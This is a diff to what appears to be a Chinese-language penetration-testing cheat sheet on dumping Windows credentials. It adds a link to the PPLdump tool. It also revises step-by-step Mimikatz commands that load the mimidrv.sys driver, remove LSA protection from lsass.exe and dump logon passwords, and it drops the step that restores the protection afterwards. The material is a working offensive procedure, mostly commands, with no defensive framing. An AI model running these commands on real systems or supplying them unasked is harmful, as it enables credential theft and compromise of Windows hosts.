@@ -185,6 +185,10 @@ sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
+### PPLdump
+
+- https://github.com/itm4n/PPLdump
+
 ### SharpDump
 
 - [SharpDump](https://github.com/GhostPack/SharpDump)
@@ -702,17 +706,18 @@ misc::clip
 
 RunAsPPL 有效地阻止了 Mimikatz 访问的内存 lsass.exe
 
-为此，Mimikatz 使用数字签名的驱动程序来删除内核中 Process 对象的保护标志。该文件 mimidrv.sys 必须位于当前文件夹中，以便使用命令作为内核驱动程序服务加载!+。然后，您可以使用命令! processprotect 删除保护并最终访问 lsass.exe。
+为此 Mimikatz 使用数字签名的驱动程序来删除内核中 Process 对象的保护标志。该文件 mimidrv.sys 必须位于当前文件夹中，以便使用 `!+` 命令作为内核驱动程序服务加载 。然后，使用命令 `!processprotect` 删除保护并最终访问 lsass.exe。
+
+加载之后即可关闭 LSA 保护，正常 dump hash
 ```
+mimikatz # privilege::debug
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
-mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
 
-完成后，您甚至可以使用相同的命令 “恢复” 保护，而无需使用 / remove 参数，最后使用!- 卸载驱动程序。
+完成后，可以使用 `!-` 卸载驱动程序。
 ```
-mimikatz # !processprotect /process:lsass.exe
 mimikatz # !-
 ```
 
